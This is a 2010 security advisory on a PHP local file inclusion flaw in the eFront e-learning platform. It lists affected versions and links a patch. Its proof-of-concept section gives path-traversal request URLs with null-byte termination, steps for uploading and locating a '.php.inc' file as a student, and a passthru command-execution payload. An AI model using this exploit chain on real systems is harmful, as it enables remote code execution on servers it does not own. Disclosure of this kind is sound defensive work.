         eFront-learning PHP file inclusion vulnerability



1. *Advisory Information*

Title: eFront-learning PHP file inclusion vulnerability
Advisory Id: CORE-2010-0311
Advisory URL:
http://www.coresecurity.com/content/efront-php-file-inclusion
Date published: 2010-03-16
Date of last update: 2010-03-16
Vendors contacted: Vendor name
Release mode: Coordinated release


2. *Vulnerability Information*

Class: PHP file inclusion [CWE-98]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: N/A
CVE Name: N/A


3. *Vulnerability Description*

eFront [1] is an easy-to-use, open source and object-oriented
multilingual eLearning platform that can be used to build learning
communities, educate and retain the end-users.

eFront is vulnerable to local file inclusion vulnerability, which
allows an external remote attacker to upload an arbitrary file and
execute code on the vulnerable website learning platform.


4. *Vulnerable packages*

   . eFront v3.5.5.
   . Older versions are probably affected too, but they were not checked.


5. *Non-vulnerable packages*

   . eFront v3.6.


6. *Vendor Information, Solutions and Workarounds*

We have issued a patch that addresses this problem, as well as a new
eFront 3.5.5 bundle that includes the fix.

   . Link to the patch:
http://sourceforge.net/projects/efrontlearning/files/efront_3.5.x_editor_security_patch.zip/download.

   . Link to the corresponding forum announcement and discussion:

7. *Credits*

This vulnerability was discovered and researched by 7safe's
Penetration Testing Team, [2].


8. *Technical Description / Proof of Concept Code*

eFront-learning is vulnerable to local file inclusion vulnerability.
The file 'language.php' located in
'/www/editor/tiny_mce/langs/language.php' has the following code:

/-----
include_once $path."language/lang-".$_GET['langname'].".php.inc";
- -----/
 Thus any arbitrary file can be included, using the following attack
vector:

/-----
http://192.168.xxx.xxx/efront/www/editor/tiny_mce/langs/language.php?langname=a/../../../../../../boot.ini%00
- -----/
 Magic quote must be disabled for successful inclusions of files with
extensions other than '.php.inc'.

Further, the software allows files with extension '.php.inc' to be
uploaded on to the server. These files can be uploaded as a user in
student role via 'send-message' functionality (attaching a file with
extension '.php.inc').

/-----
http://192.168.xxx.xxx/efront/www/forum/new_message.php
- -----/
 The attached document gets saved in directory:

/-----
/wwwroot/www/efront/upload/[username]/message_attachments/Sent/[timestamp]/
- -----/
 The value of the directory name '[timestamp]' can be calculated by
passing the date/time of the message sent (can be found in
'Tools->Messages->Sent functionality') as the input parameters to the
PHP function 'mktime()'. For example, 'echo mktime(18, 15, 29, 2, 22,
2010)' gives us 1266862529.

Once the file location of the uploaded file has been obtained, then
remote code can be executed on the vulnerable website by including
this malicious file:

/-----
http://localhost:81/efront/www/editor/tiny_mce/langs/language.php?langname=../../../../upload/student/message_attachments/Sent/1266862529/malicious.php.inc%00
- -----/
 If the malicious file 'malicious.php.ini' would contain following code:

/-----
<?php
   passthru("net users");
?>

- -----/
 Attacker will be able to enumerate users on target machine.
